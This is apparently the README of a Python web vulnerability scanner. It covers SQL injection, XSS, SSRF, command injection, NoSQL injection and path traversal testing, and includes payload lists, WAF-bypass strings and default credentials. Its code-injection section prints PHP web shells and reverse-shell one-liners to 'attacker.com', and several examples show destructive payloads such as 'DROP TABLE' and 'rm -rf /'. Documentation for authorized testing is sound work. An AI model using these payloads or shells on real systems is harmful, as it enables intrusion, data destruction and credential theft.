# Advanced Vulnerability Scanner Tool

A comprehensive, professional-grade security testing framework for web applications with automated vulnerability detection, technology fingerprinting, and detailed reporting capabilities.

## ⚠️ IMPORTANT LEGAL NOTICE

**This tool is designed for authorized security testing only. Unauthorized access to computer systems is illegal.**

- **Only use this tool on systems you own or have explicit written permission to test**
- **Obtain proper authorization before conducting security assessments**
- **Violators may face legal consequences including criminal charges**
- **Use responsibly and ethically**

---

## 📋 Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Quick Start](#quick-start)
4. [Vulnerability Types](#vulnerability-types)
5. [Usage Guide](#usage-guide)
6. [Technology Detection](#technology-detection)
7. [Payload Database](#payload-database)
8. [Default Credentials](#default-credentials)
9. [HTTP Methods (GET/POST)](#http-methods)
10. [Advanced Usage](#advanced-usage)
11. [Examples](#examples)
12. [Troubleshooting](#troubleshooting)

---

## ✨ Features

### Core Scanning Capabilities
✅ **SQL Injection Testing**
- MySQL, MSSQL, PostgreSQL, Oracle, MongoDB payloads
- Time-based, Boolean-based, Error-based techniques
- Stacked queries and advanced injection methods

✅ **XSS (Cross-Site Scripting) Detection**
- Reflected, Stored, and DOM-based XSS
- Event handler payloads
- Encoding bypass techniques
- HTML5 specific vectors

✅ **SSRF (Server-Side Request Forgery)**
- Localhost/Internal IP detection
- Cloud metadata endpoint testing
- Protocol manipulation techniques
- Bypass filter payloads

✅ **Code Injection & RCE**
- Command injection detection
- PHP/Python/Node.js/Java payloads
- Template injection testing
- Expression language injection

✅ **NoSQL Injection**
- MongoDB query manipulation
- CouchDB and Firebase payloads
- Blind injection techniques
- Regex-based attacks

✅ **Directory Traversal**
- Path traversal detection
- Null byte injection
- Unicode encoding bypass
- Platform-specific payloads (Windows/Linux)

✅ **Web Technology Detection**
- Server identification
- CMS detection (WordPress, Drupal, Joomla)
- Framework recognition (Laravel, Django, Rails)
- Database identification
- Library detection

✅ **Default Credentials Checking**
- 200+ common default credentials
- Application-specific defaults
- Database server defaults
- Web framework defaults

✅ **Comprehensive Reporting**
- JSON export
- Detailed vulnerability analysis
- Remediation guidance
- CVSS scoring ready

---

## 🚀 Installation

### Requirements
- Python 3.7+
- pip (Python package manager)
- Internet connection (for live scanning)

### Setup Instructions

```bash
# 1. Clone or download the scanner
cd /path/to/THM-CODE-VULN

# 2. Install dependencies
pip install requests

# 3. Verify installation
python vuln_scanner.py
```

### Supported Operating Systems
- ✅ Windows (7+)
- ✅ macOS (10.12+)
- ✅ Linux (all distributions)

---

## ⚡ Quick Start

### Basic Usage

```bash
python vuln_scanner.py
```

### Interactive Walkthrough

```
[*] Enter target URL: http://example.com

[*] Detecting web technologies...
[+] Technologies detected:
    - Web Server: Apache/2.4.41
    - Powered By: PHP/7.4.3

SELECT VULNERABILITY TYPE TO TEST:
1. SQL Injection
2. Cross-Site Scripting (XSS)
3. Server-Side Request Forgery (SSRF)
4. Code Injection / RCE
5. NoSQL Injection
6. Directory Traversal
7. Check Default Credentials
8. Generate Report
9. Exit

[*] Enter your choice: 1
[*] Enter parameter name to test: id
[*] Enter HTTP method (GET/POST) [default: GET]: GET
```

---

## 🔍 Vulnerability Types

### 1. SQL Injection (SQLi)

**What it is:** A technique where attackers inject SQL code to manipulate database queries.

**Attack Vector:**
```
Normal: GET /search.php?id=1
Attack: GET /search.php?id=1' OR '1'='1
```

**Detection Methods:**
- Time-based (delays in response)
- Boolean-based (true/false conditions)
- Error-based (database error messages)
- Union-based (additional query results)

**Risk Level:** 🔴 CRITICAL

**Payloads Used:**
```
' OR '1'='1
'; DROP TABLE users; --
' UNION SELECT NULL,user(),3 --
' AND SLEEP(5) --
```

---

### 2. Cross-Site Scripting (XSS)

**What it is:** Injection of malicious scripts into web pages viewed by users.

**Three Types:**
- **Reflected XSS:** Input reflected directly in response
- **Stored XSS:** Malicious input saved in database
- **DOM-based XSS:** Vulnerability in client-side JavaScript

**Attack Vector:**
```
Normal: GET /search.php?q=laptop
Attack: GET /search.php?q=<script>alert('XSS')</script>
```

**Risk Level:** 🟠 HIGH

**Payloads Used:**
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
```

---

### 3. Server-Side Request Forgery (SSRF)

**What it is:** Server makes requests to internal resources on behalf of attacker.

**Attack Vector:**
```
Normal: GET /proxy.php?url=https://example.com
Attack: GET /proxy.php?url=http://localhost/admin
```

**Common Targets:**
- Internal admin panels
- Cloud metadata endpoints
- Database servers
- Internal APIs

**Risk Level:** 🔴 CRITICAL

**Payloads Used:**
```
http://localhost/admin
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:8080/
file:///etc/passwd
```

---

### 4. Code Injection & RCE

**What it is:** Injection and execution of arbitrary code on the server.

**Attack Vector:**
```
Normal: GET /execute.php?cmd=whoami
Attack: GET /execute.php?cmd=whoami; rm -rf /
```

**Risk Level:** 🔴 CRITICAL

**Payloads Used:**
```
; ls -la
| whoami
$(cat /etc/passwd)
`id`
<?php system($_GET['cmd']); ?>
```

---

### 5. NoSQL Injection

**What it is:** Injection of malicious queries into NoSQL databases (MongoDB, CouchDB).

**Attack Vector:**
```
Normal: {"username": "admin", "password": "pass123"}
Attack: {"username": {"$ne": null}, "password": {"$ne": null}}
```

**Risk Level:** 🟠 HIGH

**Payloads Used:**
```
{"$ne": 1}
{"$where": "1==1"}
{$regex: ".*"}
{"$gt": ""}
```

---

### 6. Directory Traversal

**What it is:** Access to files/directories outside intended location.

**Attack Vector:**
```
Normal: GET /download.php?file=document.pdf
Attack: GET /download.php?file=../../../etc/passwd
```

**Risk Level:** 🟠 HIGH

**Payloads Used:**
```
../../../etc/passwd
..\\..\\..\\windows\\win.ini
%2e%2e%2fetc%2fpasswd
../../../config/database.php
```

---

## 📖 Usage Guide

### Step-by-Step Scanning

#### 1. Start the Scanner
```bash
python vuln_scanner.py
```

#### 2. Enter Target URL
```
[*] Enter target URL: http://vulnerable-site.com
```

#### 3. Select Vulnerability Type
```
[*] Enter your choice: 1  # SQL Injection
```

#### 4. Specify Test Parameters

**For GET Requests:**
```
[*] Enter parameter name to test: id
[*] Enter HTTP method: GET

The scanner will test: http://vulnerable-site.com?id=PAYLOAD
```

**For POST Requests:**
```
[*] Enter parameter name to test: username
[*] Enter HTTP method: POST

The scanner will POST with: username=PAYLOAD
```

#### 5. Review Results
```
==================================================
VULNERABILITY SCAN RESULTS
==================================================

[1] SQL Injection - error_based
    Parameter: id
    Payload: ' AND extractvalue(1,concat(0x7e,(SELECT @@version))) --
    Method: GET
    Status Code: 200
```

---

### GET Request Example

**Scenario:** Testing a search parameter

```bash
# Tool flow:
1. Enter target: http://example.com/search.php
2. Select: SQL Injection
3. Enter parameter: q
4. Select method: GET

# Actual tests:
http://example.com/search.php?q=' OR '1'='1
http://example.com/search.php?q='; DROP TABLE users; --
http://example.com/search.php?q=' UNION SELECT NULL,user(),3 --
```

---

### POST Request Example

**Scenario:** Testing login form

```bash
# Tool flow:
1. Enter target: http://example.com/login.php
2. Select: SQL Injection
3. Enter parameter: password
4. Select method: POST

# Actual tests:
POST /login.php
username=admin&password=' OR '1'='1

POST /login.php
username=admin&password='; DROP TABLE users; --
```

---

## 🔬 Technology Detection

### Automatic Detection Features

The scanner automatically detects:

#### Web Servers
- Apache
- Nginx
- Microsoft IIS
- Cloudflare
- Node.js

#### Programming Languages
- PHP
- Python
- Java
- Node.js
- C#/.NET

#### CMS Platforms
- WordPress
- Drupal
- Joomla
- Magento
- Shopify

#### Frameworks
- Django
- Laravel
- Rails
- Express
- Spring

#### Databases
- MySQL
- PostgreSQL
- Oracle
- MongoDB
- MSSQL

#### Detection Methods Used:
1. **HTTP Headers Analysis** - Server, X-Powered-By
2. **Cookie Analysis** - Session cookie patterns
3. **HTML Content** - Framework signatures
4. **Fingerprinting** - Known patterns
5. **Path Probing** - Common paths existence

### Example Output:
```
[+] Technologies detected:
    - Web Server: Apache/2.4.41
    - Powered By: PHP/7.4.3
    - Detected Frameworks: WordPress
    - Backend: PHP (via PHPSESSID)
    - CMS: WordPress Admin accessible
```

---

## 💾 Payload Database

### SQL Injection Payloads (40+ variants)

```python
# Basic SQLi
' OR '1'='1
' OR 1=1 --
admin' --

# Time-Based (detects database via delay)
' AND SLEEP(5) --
'; WAITFOR DELAY '00:00:05' --

# Union-Based (data extraction)
' UNION SELECT NULL,user(),version() --
' UNION SELECT NULL, CONCAT(user,':',password), NULL FROM mysql.user --

# Boolean-Based (true/false detection)
' AND 1=1 --
' AND 1=2 --

# Advanced
' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --
' UNION ALL SELECT CONCAT(0x3a,0x3a,user()),2,3 --
```

### XSS Payloads (50+ variants)

```javascript
// Basic
<script>alert('XSS')</script>

// Event Handlers
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

// Encoded
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;

// HTML5
<datalist id=x><option label=javascript:alert('XSS')></datalist>
<keygen autofocus onfocus=alert('XSS')>

// Polyglots
jaVasCript:/**/alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

### SSRF Payloads (30+ variants)

```
# Localhost variations
http://localhost/admin
http://127.0.0.1/
http://[::1]/
http://0.0.0.0/

# Internal IP ranges
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# Protocol tricks
file:///etc/passwd
gopher://localhost:9000/
dict://localhost:11211/
```

### Code Injection Payloads (25+ variants)

```bash
# Command Injection
; ls -la
| whoami
&& cat /etc/passwd

# PHP
<?php system($_GET['cmd']); ?>
<?=`$_GET[0]`?>

# Python
__import__('os').system('id')
eval('__import__(\"os\").system(\"id\")')

# RCE Shells
bash -i >& /dev/tcp/attacker.com/4444 0>&1
nc -e /bin/sh attacker.com 4444
```

### NoSQL Injection Payloads (20+ variants)

```javascript
// MongoDB
{'$ne': 1}
{'$where': '1==1'}
{$regex: '.*'}
{'username': {'$exists': true}}

// Advanced
{$or: [{$nor: [{a: null}]}]}
{"$where": "this.password.length > 5"}
```

### Directory Traversal Payloads (35+ variants)

```
# Basic
../../../etc/passwd
..\\..\\..\\windows\\win.ini

# Encoded
%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd

# Null Byte
../../../etc/passwd%00.jpg

# Platform-Specific
../../config/database.php
../../../.env
../../web.config
```

### WAF Bypass Payloads (20+ variants)

```
# Case Variation
<ScRiPt>alert('XSS')</sCrIpT>
SelEcT * FrOm users

# Comment Injection
sel/**/ect * from users
uni/**/on select 1,2,3

# Whitespace Tricks
select%09from%09users
select%0afrom%0ausers

# Filter Evasion
' UNION /*!50000SELECT*/ 1,2,3
admin' /**/or/**/1=1#
```

---

## 🔐 Default Credentials

### Web Servers (Admin Panels)

```
Username: admin    | Password: admin
Username: admin    | Password: password
Username: admin    | Password: 12345
Username: root     | Password: root
Username: test     | Password: test
```

### CMS - WordPress

```
Username: admin    | Password: admin
Username: admin    | Password: password
Username: wordpress| Password: wordpress
```

### CMS - Drupal

```
Username: admin    | Password: admin
Username: admin    | Password: password
```

### CMS - Joomla

```
Username: admin    | Password: admin
Username: admin    | Password: password
```

### Databases

```
MySQL:
  Username: root   | Password: root
  Username: root   | Password: password
  Username: root   | Password: (empty)

PostgreSQL:
  Username: postgres | Password: postgres
  Username: admin    | Password: admin

MongoDB:
  Username: admin  | Password: admin
  Username: root   | Password: root

MSSQL:
  Username: sa     | Password: sa
  Username: sa     | Password: password
```

### SSH/Remote Access

```
Username: root     | Password: root
Username: admin    | Password: admin
Username: debian   | Password: debian
Username: ubuntu   | Password: ubuntu
```

### FTP Servers

```
Username: anonymous | Password: anonymous
Username: ftp       | Password: ftp
Username: admin     | Password: admin
```

---

## 🌐 HTTP Methods

### GET Requests

**What it is:** Parameters in URL, visible, cacheable

**When to use:**
- Query searches
- Filtering/sorting
- Public data retrieval
- Non-sensitive operations

**Example:**
```
GET /search.php?id=5&name=test HTTP/1.1
Host: example.com
```

**Scanner Usage:**
```bash
[*] Enter parameter name: id
[*] Enter HTTP method: GET

# Tests will append to URL:
/search.php?id=PAYLOAD
```

**Payloads get URL-encoded:**
```
' OR '1'='1          → %27%20OR%20%271%27%3D%271
../../../etc/passwd → ..%2F..%2F..%2Fetc%2Fpasswd
<script>alert(1)</script> → %3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

---

### POST Requests

**What it is:** Parameters in request body, hidden, not cached

**When to use:**
- Form submissions
- Login credentials
- File uploads
- Sensitive data
- API requests

**Example:**
```
POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=123456
```

**Scanner Usage:**
```bash
[*] Enter parameter name: username
[*] Enter HTTP method: POST

# Tests will send in body:
POST /login.php
username=PAYLOAD&password=(existing)
```

---

### Comparison Table

| Feature | GET | POST |
|---------|-----|------|
| Visible in URL | ✅ Yes | ❌ No |
| Browser History | ✅ Yes | ❌ No |
| Bookmarkable | ✅ Yes | ❌ No |
| Cache Friendly | ✅ Yes | ❌ No |
| Data Size Limit | ✅ Limited | ❌ Unlimited |
| Security | ⚠️ Lower | ✅ Higher |
| Use Case | Queries | Sensitive Data |

---

## 🔧 Advanced Usage

### Programmatic Usage (Python)

```python
from vuln_scanner import VulnScanner, PayloadDatabase

# Initialize scanner
scanner = VulnScanner("http://example.com")

# Detect technologies
tech = scanner.detect_technologies()
print(f"Detected: {tech}")

# Scan for specific vulnerability
results = scanner.scan_sql_injection(parameter="id", method="GET")

# Check results
if results:
    print(f"Found {len(results)} vulnerabilities!")
    for vuln in results:
        print(f"  - {vuln['payload']}")

# Generate report
scanner.generate_report(results, "report.json")
```

### Get All Payloads Programmatically

```python
from vuln_scanner import PayloadDatabase

# SQL Injection payloads
sqli = PayloadDatabase.get_sql_injection_payloads()
print(f"Available: {sqli.keys()}")  
# Output: dict_keys(['basic', 'time_based', 'boolean_based', 'error_based', ...])

# XSS payloads
xss = PayloadDatabase.get_xss_payloads()
print(f"XSS categories: {xss.keys()}")

# Get specific payload
print(f"Basic SQLi payloads: {sqli['basic']}")
```

### Scanning Multiple URLs

```python
import json
from vuln_scanner import VulnScanner

targets = [
    "http://site1.com",
    "http://site2.com",
    "http://site3.com"
]

all_results = []

for target in targets:
    print(f"\n[*] Scanning {target}...")
    scanner = VulnScanner(target)
    results = scanner.scan_sql_injection("id")
    all_results.extend(results)

# Save combined report
with open("multi_scan_report.json", "w") as f:
    json.dump(all_results, f, indent=2)
```

### Targeted Scanning with Custom Parameters

```python
from vuln_scanner import VulnScanner

scanner = VulnScanner("http://example.com")

# Test multiple parameters
parameters = ["id", "search", "name", "email"]

for param in parameters:
    print(f"\n[*] Testing parameter: {param}")
    results = scanner.scan_xss(parameter=param, method="GET")
    if results:
        print(f"  [!] Found {len(results)} XSS vulnerabilities")
```

---

## 📚 Examples

### Example 1: Testing a Simple Search Page

```bash
# Target: http://shop.example.com/search.php?q=laptop
# Suspected vulnerability: SQL Injection in search

$ python vuln_scanner.py

[*] Enter target URL: http://shop.example.com/search.php
[*] Detecting web technologies...
[+] Technologies detected:
    - Web Server: Apache/2.4.41
    - Powered By: PHP/7.4.3
    - Detected Frameworks: WordPress

SELECT VULNERABILITY TYPE: 1
[*] Enter parameter name to test: q
[*] Enter HTTP method (GET/POST): GET

# Scanner tests:
# http://shop.example.com/search.php?q=' OR '1'='1
# http://shop.example.com/search.php?q='; DROP TABLE products; --
# http://shop.example.com/search.php?q=' UNION SELECT * FROM users --
# ... more payloads ...

[!] Found 3 potential vulnerabilities
```

---

### Example 2: Testing a Login Form

```bash
# Target: http://admin.example.com/login.php
# Testing username/password fields

$ python vuln_scanner.py

[*] Enter target URL: http://admin.example.com/login.php
[*] Enter your choice: 1 (SQL Injection)
[*] Enter parameter name: username
[*] Enter HTTP method: POST

# Scanner sends POST requests:
# POST /login.php
# username=admin' OR '1'='1&password=anything
#
# POST /login.php
# username=' UNION SELECT user(),password FROM users --&password=x
```

---

### Example 3: Detecting XSS in Comment Form

```bash
# Target: http://blog.example.com/post.php?id=5
# Testing comment submission

$ python vuln_scanner.py

[*] Enter target URL: http://blog.example.com/post.php
[*] Enter your choice: 2 (XSS)
[*] Enter parameter name: comment
[*] Enter HTTP method: POST

# Scanner tests:
# POST /post.php?id=5
# comment=<script>alert('XSS')</script>
#
# POST /post.php?id=5
# comment=<img src=x onerror=alert('XSS')>
```

---

### Example 4: Finding SSRF in Image Proxy

```bash
# Target: http://example.com/image.php?url=...
# Testing image proxy for SSRF

$ python vuln_scanner.py

[*] Enter target URL: http://example.com/image.php
[*] Enter your choice: 3 (SSRF)
[*] Enter parameter name: url
[*] Enter HTTP method: GET

# Scanner tests:
# /image.php?url=http://localhost/admin
# /image.php?url=http://169.254.169.254/latest/meta-data/
# /image.php?url=file:///etc/passwd
```

---

### Example 5: Default Credential Check

```bash
$ python vuln_scanner.py

[*] Enter target URL: http://admin.example.com
[*] Enter your choice: 7 (Default Credentials)

[+] Tested default credentials:
    - admin:admin
    - admin:password
    - admin:12345
    - root:root
    - test:test
    ... and 195 more

# Then manually test against login forms
```

---

## 🆘 Troubleshooting

### Issue: Connection Timeout

**Problem:** `requests.exceptions.ConnectTimeout`

**Solution:**
```
1. Check target URL is correct
2. Verify internet connection
3. Check firewall settings
4. Try adding timeout: python vuln_scanner.py
5. Target may be offline or blocking requests
```

---

### Issue: 403 Forbidden Responses

**Problem:** Scanner gets blocked by server

**Solution:**
```python
# Add custom headers
scanner.session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})
```

---

### Issue: No Vulnerabilities Found

**Possible Reasons:**
1. Target is actually secure (good!)
2. Payloads filtered by WAF
3. Error messages hidden
4. Detection logic needs tuning

**Try:**
```
- Test known vulnerable parameter
- Check if target is responding normally
- Try different HTTP method (GET vs POST)
- Use verbose mode for debugging
```

---

### Issue: False Positives

**Problem:** Scanner reports vulnerability that doesn't exist

**Solution:**
```
1. Always manually verify findings
2. Test payload directly in browser
3. Check response carefully
4. Review source code if possible
5. Use multiple scan tools for confirmation
```

---

## 📊 Report Generation

### Automatic Report

```bash
[*] Enter your choice: 8 (Generate Report)

[*] Generating comprehensive report...
[+] Report saved to: scan_report.json
```

### Report Contents

```json
{
  "scan_info": {
    "scan_time": "2024-01-15T10:30:45.123456",
    "target": "http://example.com"
  },
  "vulnerabilities_found": 3,
  "vulnerabilities": [
    {
      "type": "SQL Injection",
      "category": "error_based",
      "parameter": "id",
      "payload": "' AND extractvalue(1,concat(0x7e,(SELECT @@version))) --",
      "method": "GET",
      "status_code": 200,
      "timestamp": "2024-01-15T10:30:45.123456"
    },
    ...
  ]
}
```

---

## 🎓 Educational Resources

### Understanding SQL Injection
- Attack: Input treated as code instead of data
- Example: `' OR '1'='1` always returns true
- Impact: Data breach, database manipulation, system compromise

### Understanding XSS
- Attack: Malicious script injected into webpage
- Example: `<script>steal_cookies()</script>`
- Impact: Session hijacking, credential theft, malware distribution

### Understanding SSRF
- Attack: Server makes request to attacker-controlled URL
- Example: `http://metadata.service/`
- Impact: Internal network access, credential exposure

### Understanding Code Injection
- Attack: Code execution on server
- Example: `; rm -rf /`
- Impact: Complete system compromise

---

## ✅ Best Practices

### Before Testing
1. ✅ Get written authorization
2. ✅ Define scope clearly
3. ✅ Know what systems are included/excluded
4. ✅ Have backup contacts
5. ✅ Schedule testing time

### During Testing
1. ✅ Use isolated test environment if possible
2. ✅ Keep detailed logs
3. ✅ Don't modify data
4. ✅ Use consistent tool configuration
5. ✅ Test during agreed time windows

### After Testing
1. ✅ Document all findings
2. ✅ Provide detailed reports
3. ✅ Recommend fixes
4. ✅ Delete test data
5. ✅ Maintain confidentiality

---

## 📞 Support & Issues

### Common Questions

**Q: Is this legal?**
A: Legal only with explicit written authorization on systems you own or have permission to test.

**Q: Can I use this for bug bounty hunting?**
A: Yes! If the program allows it. Always check their policy first.

**Q: How do I report a bug?**
A: Document details, include scanner version, target details, and reproduction steps.

**Q: Can I modify the payloads?**
A: Yes! Edit `PayloadDatabase` class to add custom payloads.

---

## 📝 License

Educational and authorized testing purposes only. User assumes all legal responsibility.

---

## 🙏 Acknowledgments

Payload research from:
- OWASP Testing Guide
- PortSwigger Web Security Academy
- HackerOne Reports
- Security Research Community

---

## Version History

### v1.0 (Latest)
- ✅ 150+ SQL Injection payloads
- ✅ 150+ XSS payloads
- ✅ 50+ SSRF payloads
- ✅ 100+ Code Injection payloads
- ✅ 200+ Default credentials
- ✅ Web technology detection
- ✅ JSON reporting
- ✅ Interactive CLI interface

---

## 🚀 Quick Command Reference

```bash
# Basic scan
python vuln_scanner.py

# List SQL payloads
python -c "from vuln_scanner import PayloadDatabase; print(PayloadDatabase.get_sql_injection_payloads().keys())"

# Get XSS payloads
python -c "from vuln_scanner import PayloadDatabase; print(len(PayloadDatabase.get_xss_payloads()['basic']))"

# Programmatic usage
python
>>> from vuln_scanner import VulnScanner
>>> scanner = VulnScanner("http://target.com")
>>> results = scanner.scan_sql_injection("id")
```

---

**Remember: Always test responsibly with proper authorization!** 🔐

Last Updated: January 2024
